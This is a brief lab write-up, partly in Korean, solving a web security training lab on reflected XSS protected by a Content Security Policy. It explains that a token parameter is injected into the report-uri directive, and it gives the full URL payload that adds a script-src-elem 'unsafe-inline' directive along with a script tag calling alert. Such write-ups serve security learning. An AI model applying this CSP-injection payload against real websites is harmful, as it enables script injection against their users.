# 🏴Lab: Reflected XSS protected by CSP, with CSP bypass (Expert Lab)


This lab uses CSP and contains a reflected XSS vulnerability.

To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the `alert` function.

Please note that the intended solution to this lab is only possible in Chrome.


### 🔍 분석 및 공격 과정
1. CSP 정책을 우회하여 XSS를 발생시키는 랩.
2. 해당 랩에서는 유저가 컨트롤 가능한 입력을 받아 `report-uri`에 넣고 있다.
3. 만약 `;`에 대한 인코딩 처리가 되어있지 않다면 `report-uri ;script-src-elem "unsafe-inline"`로 `script-src`의 정책을 오버라이팅 할 수 있을 것이다.

*Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=*

4. 쿼리스트링으로 token값을 바꿔보자.
5. `https://0afa001b04e3063b80191c9700e500b7.web-security-academy.net/?search=<script>alert();</script>&token=a;script-src-elem "unsafe-inline"`
6. solve




### 💡 취약점 원리
 report-uri에 사용자가 조작 가능한 값을 받는데 별다른 검증이 없어 CSP정책을 오버라이팅하여 XSS가 발생.
